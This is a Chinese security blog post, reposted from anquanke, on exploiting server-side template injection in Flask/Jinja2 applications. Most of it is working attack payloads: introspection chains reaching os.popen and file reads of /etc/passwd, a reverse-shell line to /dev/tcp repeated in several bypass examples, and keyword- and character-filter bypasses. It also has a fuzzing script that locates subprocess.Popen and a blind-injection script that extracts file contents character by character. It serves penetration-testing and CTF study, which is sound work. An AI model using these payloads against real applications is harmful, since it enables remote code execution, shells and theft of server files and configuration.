> 原文链接: https://www.anquanke.com//post/id/246094 


# SSTI漏洞学习（下）——Flask/Jinja模板引擎的相关绕过


                                阅读量   
                                **23999**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t01894129e1e0f73a56.png)](https://p1.ssl.qhimg.com/t01894129e1e0f73a56.png)



## 0x01 再看寻找Python SSTI攻击载荷的过程

获取基本类

```
对于返回的是定义的Class内的话:
__dict__   //返回类中的函数和属性，父类子类互不影响
__base__ //返回类的父类 python3
__mro__ //返回类继承的元组，(寻找父类) python3
__init__ //返回类的初始化方法   
__subclasses__()  //返回类中仍然可用的引用  python3
__globals__  //对包含函数全局变量的字典的引用 python3
对于返回的是类实例的话:
__class__ //返回实例的对象，可以使类实例指向Class，使用上面的魔术方法
```

```
''.__class__.__mro__[2]
`{``}`.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
```

此外，在引入了Flask/Jinja的相关模块后还可以通过

```
config
request
url_for
get_flashed_messages
self
redirect
```

等获取基本类,

获取基本类后，继续向下获取基本类(object)的子类

```
object.__subclasses__()
```

找到重载过的`__init__`类

在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的

也可以利用`.index()`去找`file`,`warnings.catch_warnings`

```
&gt;&gt;&gt; ''.__class__.__mro__[2].__subclasses__()[99].__init__
&lt;slot wrapper '__init__' of 'object' objects&gt;
&gt;&gt;&gt; ''.__class__.__mro__[2].__subclasses__()[59].__init__
&lt;unbound method WarningMessage.__init__&gt;
```

查看其引用`__builtins__`

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']
```

这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file等函数来实现读取文件的功能

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()
```

常用的目标函数有这么几个

```
file
subprocess.Popen
os.popen
exec
eval
```

常用的中间对象有这么几个

```
catch_warnings.__init__.func_globals.linecache.os.popen('bash -i &gt;&amp; /dev/tcp/127.0.0.1/233 0&gt;&amp;1')
lipsum.__globals__.__builtins__.open("/flag").read()
linecache.os.system('ls')
```

更多的可利用类可以通过遍历筛选的方式找到

比如对`subprocess.Popen`我们可以构造如下fuzz脚本

```
import requests

url = ""

index = 0
for i in range(100, 1000):
    #print i
    payload = "`{``{`''.__class__.__mro__[2].__subclasses__()[%d]`}``}`" % (i)
    params = `{`
        "search": payload
    `}`
    #print(params)
    req = requests.get(url,params=params)
    #print(req.text)
    if "subprocess.Popen" in req.text:
        index = i
        break


print("index of subprocess.Popen:" + str(index))
print("payload:`{``{`''.__class__.__mro__[2].__subclasses__()[%d]('ls',shell=True,stdout=-1).communicate()[0].strip()`}``}`" % i)
```

那么我们也可以利用``{`%for%`}``语句块来在服务端进行fuzz

```
`{`% for c in [].__class__.__base__.__subclasses__() %`}`
  `{`% if c.__name__=='catch_warnings' %`}`
  `{``{` c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('&lt;command&gt;').read()") `}``}`
  `{`% endif %`}`
`{`% endfor %`}`
```



## 0x02 一些Trick
<li>Python 字符的几种表示方式
<ul>
<li>16进制 `\x41`
</li>
<li>8进制 `\101`
</li>
<li>unicode `\u0074`
</li>
- base64 `'X19jbGFzc19f'.decode('base64')` python3
<li>join `"fla".join("/g")`
</li>
<li>slice `"glaf"[::-1]`
</li>
<li>lower/upper `["__CLASS__"|lower`
</li>
<li>format `"%c%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95)`
</li>
<li>replace `"__claee__"|replace("ee","ss")`
</li>
<li>reverse `"__ssalc__"|reverse`
</li>- python字典或列表获取键值或下标的几种方式
```
dict['__builtins__']
dict.__getitem__('__builtins__')
dict.pop('__builtins__')
dict.get('__builtins__')
dict.setdefault('__builtins__')
list[0]
list.__getitem__(0)
list.pop(0)
```
<li>SSTI 获取对象元素的几种方式
<ul>
- `class.attr`
- `class.__getattribute__('attr')`
- `class['attr']`
- `class|attr('attr')`
- `"".__class__.__mro__.__getitem__(2)`
- `['__builtins__'].__getitem__('eval')`
- `class.pop(40)`
```
request.args.name    #GET name
request.cookies.name #COOKIE name
request.headers.name #HEADER name
request.values.name  #POST or GET Name
request.form.name    #POST NAME
request.json         #Content-Type json
```
- 通过拿到`current_app`这个对象获取当前`flask App`的上下文信息，实现config读取
比如

```
`{``{`url_for.__globals__.current_app.config`}``}`
`{``{`url_for.__globals__['current_app'].config`}``}`
`{``{`get_flashed_messages.__globals__['current_app'].config.`}``}`
`{``{`request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].cofig`}``}`
```



## 0x03 Bypass的手段

在对Jinjia SSTI注入时，本质是在Jinja的沙箱中进行代码注入，因此很多绕过技巧和python沙箱逃逸是共通的

### <a class="reference-link" name="%7B%7B%7D%7D%E6%A8%A1%E6%9D%BF%E6%A0%87%E7%AD%BE%E8%BF%87%E6%BB%A4"></a>`{``{``}``}`模板标签过滤
<li>
``{`% if xxx %`}`xxx`{`% endif %`}``形式</li>
```
`{`% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('bash -i &gt;&amp; /dev/tcp/127.0.0.1/233 0&gt;&amp;1') %`}`1`{`% endif %`}`
```
- `{`% print xxx %`}` 形式
```
`{`% print ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('bash -i &gt;&amp; /dev/tcp/127.0.0.1/233 0&gt;&amp;1')
```

### <a class="reference-link" name="%E5%85%B3%E9%94%AE%E8%AF%8D%E8%BF%87%E6%BB%A4"></a>关键词过滤

#### <a class="reference-link" name="base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"></a>base64编码绕过

`__getattribute__`使用实例访问属性时,调用该方法

例如被过滤掉**class**关键词

```
`{``{`[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()`}``}`
```

#### <a class="reference-link" name="%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"></a>字符串拼接绕过

```
`{``{`[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()`}``}`
```

#### <a class="reference-link" name="%E5%88%A9%E7%94%A8dict%E6%8B%BC%E6%8E%A5"></a>利用dict拼接

```
`{`% set a=dict(o=x,s=xx)|join %`}`
```

#### <a class="reference-link" name="%E5%88%A9%E7%94%A8string"></a>利用string

比如`'`可以用下面方式拿到，存放在`quote`中

```
`{`% set quote = ((app.__doc__|list()).pop(337)|string())%`}`
```

类似的还有

```
`{`% set sp = ((app.__doc__|list()).pop(102)|string)%`}`
`{`% set pt = ((app.__doc__|list()).pop(320)|string)%`}`
`{`% set lb = ((app.__doc__|list()).pop(264)|string)%`}`
`{`% set rb = ((app.__doc__|list()).pop(286)|string)%`}`
`{`% set slas = (eki.__init__.__globals__.__repr__()|list()).pop(349)%`}`
`{`% set xhx = ((`{` `}`|select()|string()|list()).pop(24)|string())%`}`
```

通过`~`可以将得到的字符连接起来

一个eval的payload如下所示

```
`{`% set xhx = ((`{` `}`|select()|string|list()).pop(24)|string)%`}`
`{`% set sp = ((app.__doc__|list()).pop(102)|string)%`}`
`{`% set pt = ((app.__doc__|list()).pop(320)|string)%`}`
`{`% set quote = ((app.__doc__|list()).pop(337)|string)%`}`
`{`% set lb = ((app.__doc__|list()).pop(264)|string)%`}`
`{`% set rb = ((app.__doc__|list()).pop(286)|string)%`}`
`{`% set slas = (eki.__init__.__globals__.__repr__()|list()).pop(349)%`}`
`{`% set bu = dict(buil=x,tins=xx)|join %`}`
`{`% set im = dict(imp=x,ort=xx)|join %`}`
`{`% set sy = dict(po=x,pen=xx)|join %`}`
`{`% set oms = dict(o=x,s=xx)|join %`}`
`{`% set fl4g = dict(f=x,lag=xx)|join %`}`
`{`% set ca = dict(ca=x,t=xx)|join %`}`
`{`% set ev = dict(ev=x,al=xx)|join %`}`
`{`% set red = dict(re=x,ad=xx)|join%`}`
`{`% set bul = xhx*2~bu~xhx*2 %`}`

`{`% set payload = xhx*2~im~xhx*2~lb~quote~oms~quote~rb~pt~sy~lb~quote~ca~sp~slas~fl4g~quote~rb~pt~red~lb~rb %`}`
```

可以在`eval`或`exec`语句中使用，如下

```
`{`% for f,v in eki.__init__.__globals__.items() %`}` 
    `{`% if f == bul %`}` 
        `{`% for a,b in v.items() %`}`
            `{`% set x=a%`}`
            `{`% if a == ev %`}`
                `{``{`b(payload)`}``}`
            `{`% endif %`}`
        `{`% endfor %`}`
    `{`% endif %`}`
`{`% endfor %`}`
```

#### <a class="reference-link" name="Python3%20%E5%AF%B9Unicode%E7%9A%84Normal%E5%8C%96"></a>Python3 对Unicode的Normal化

比如

[![](https://p5.ssl.qhimg.com/t01e6ff8bff9d312746.png)](https://p5.ssl.qhimg.com/t01e6ff8bff9d312746.png)

可以绕过数字限制

同时在python3中会对unicode normalize，导致exec可以执行unicode代码

[![](https://p1.ssl.qhimg.com/t01bdad70a59749d7dd.png)](https://p1.ssl.qhimg.com/t01bdad70a59749d7dd.png)

#### <a class="reference-link" name="Python%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%89%B9%E6%80%A7"></a>Python的格式化字符串特性

比如

```
'`{`0:c`}`'['format'](95)
`{` "%s, %s!"|format(greeting, name) `}``}`
```

拼接起来有

```
`{``{`""['`{`0:c`}`'['format'](95)+'`{`0:c`}`'['format'](95)+'`{`0:c`}`'['format'](99)+'`{`0:c`}`'['format'](108)+'`{`0:c`}`'['format'](97)+'`{`0:c`}`'['format'](115)+'`{`0:c`}`'['format'](115)+'`{`0:c`}`'['format'](95)+'`{`0:c`}`'['format'](95)]`}``}`
```

#### <a class="reference-link" name="getlist"></a>getlist

使用`.getlist()`方法获得一个列表，这个列表的参数可以在后面传递

```
`{`%print (request.args.getlist(request.args.l)|join)%`}`&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_
```

可以获得`__class__`

### <a class="reference-link" name="%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E8%BF%87%E6%BB%A4"></a>特殊字符过滤

#### <a class="reference-link" name="%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7"></a>过滤引号

`request.args` 是flask中的一个属性,为返回请求的参数,这里把path当作变量名,将后面的路径传值进来,进而绕过了引号的过滤<br>
将其中的`request.args`改为`request.values`则利用`REQUEST`的方式进行传参

```
`{``{`().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()`}``}`&amp;path=/etc/passwd
```

#### <a class="reference-link" name="%E8%BF%87%E6%BB%A4%E5%8F%8C%E4%B8%8B%E5%88%92%E7%BA%BF"></a>过滤双下划线

同样利用`request.args`属性

```
`{``{` ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() `}``}`&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
```

```
#GET:
`{``{` ''[request.value.class][request.value.mro][2][request.value.subclasses]()[40]('/etc/passwd').read() `}``}`

#POST:
class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
```

#### 过滤`.`/`[]`

这里对获取元素方法属性进行了限制，那么我们可以使用上面Trick中介绍的获取对象元素的几种方式进行绕过

比如用原生JinJa2函数`|attr()`

将`request.__class__`改成`request|attr("__class__")`

#### <a class="reference-link" name="%E5%90%8C%E6%97%B6%E7%BB%95%E8%BF%87%E4%B8%8B%E5%88%92%E7%BA%BF%E3%80%81%E4%B8%8E%E4%B8%AD%E6%8B%AC%E5%8F%B7"></a>同时绕过下划线、与中括号

综合之前的Trick利用就行

```
`{``{`()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)('/etc/passwd')|attr(request.values.name5)()`}``}`post:name1=__class__&amp;name2=__base__&amp;name3=__subclasses__&amp;name4=pop&amp;name5=read
```

#### <a class="reference-link" name="%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7"></a>过滤圆括号
<li>对函数执行方式进行重载,比如将<br>`request.__class__.__getitem__=__builtins__.exec;`<br>
那么执行`request[payload]`时就相当于`exec(payload)`了</li>
- 使用lambda表达式进行绕过
### <a class="reference-link" name="%E5%AF%B9%E8%B1%A1%E5%B1%82%E9%9D%A2%E7%A6%81%E7%94%A8"></a>对象层面禁用
- `set `{``}`=None`
只能设置该对象为None，通过其他引用同样可以找到该对象

```
`{``{`% set config=None%`}``}` -&gt; `{``{`url_for.__globals__.current_app.config`}``}`
```
- del
```
del __builtins__.__dict__['__import__']
```

通过`reload`进行重载

```
reload(__builtins__)
```
- 其他一些小trick
比如`func.__code__.co_consts` 可以获得对应函数的上下文常量



## 0x04 盲注

盲注一般有如下几种思路
<li>反弹shell<br>
通过rce反弹一个shell出来绕过无回显的页面</li>
<li>带外注入<br>
通过requestbin或dnslog的方式将信息传到外界</li>
- 纯盲注
利用index方法

> Python index() 方法检测字符串中是否包含子字符串 str ，如果指定 beg（开始） 和 end（结束） 范围，则检查是否包含在指定范围内，该方法与 python find()方法一样，只不过如果str不在 string中会报一个异常。

比如

```
`{``{`(request.__class__.__mro__[2].__subclasses__[334].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()|string).index("r",0,3)`}``}`
```

如果`/etc/passwd`的第一个字符是`r`那么就不会触发异常，如果不是就会触发异常，根据这个特点可以进行盲注

如下是一个盲注脚本

```
import requests
from string import printable as pt

host = "http://127.0.0.1:8765/"
res  = ''

for i in range(0,40):
    for c in pt:
        payload = '`{``{`(request.__class__.__mro__[2].__subclasses__[334].__init__.__globals__["__builtins__"]["file"]("/etc/passwd").read()|string).index("%c",%d,%d)`}``}`' % (c,i,i+1) 
        param = `{`
            "name":payload
        `}`
        req = requests.get(host,params=param)

        if req.status_code == 200:
            res += c
            break
    print(res)
```



## 参考资料

[https://xz.aliyun.com/t/8029](https://xz.aliyun.com/t/8029)

[https://blog.csdn.net/miuzzx/article/details/110220425](https://blog.csdn.net/miuzzx/article/details/110220425)

[https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#%E7%B1%BB%E7%BB%A7%E6%89%BF%E4%BD%BF%E7%94%A8](https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#%E7%B1%BB%E7%BB%A7%E6%89%BF%E4%BD%BF%E7%94%A8)

[https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/](https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/)
